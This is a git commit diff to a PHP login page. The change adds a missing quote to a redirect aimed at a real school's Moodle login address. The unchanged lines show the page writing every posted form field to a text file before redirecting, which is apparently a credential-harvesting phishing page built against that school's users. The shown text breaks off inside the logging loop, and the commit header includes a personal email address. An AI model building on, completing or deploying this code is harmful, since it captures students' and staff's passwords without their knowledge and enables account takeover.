7e409398fd2d6ac5053937bf6075b1e2738738c1
E-SPIKE <1an.3dwards1234@gmail.com>
2019-04-11 09:17:45 +1000

    reee

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://moodle.jpc.act.edu.au/login/index.php);
+header ('Location:https://moodle.jpc.act.edu.au/login/index.php');
 $handle = fopen("users.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
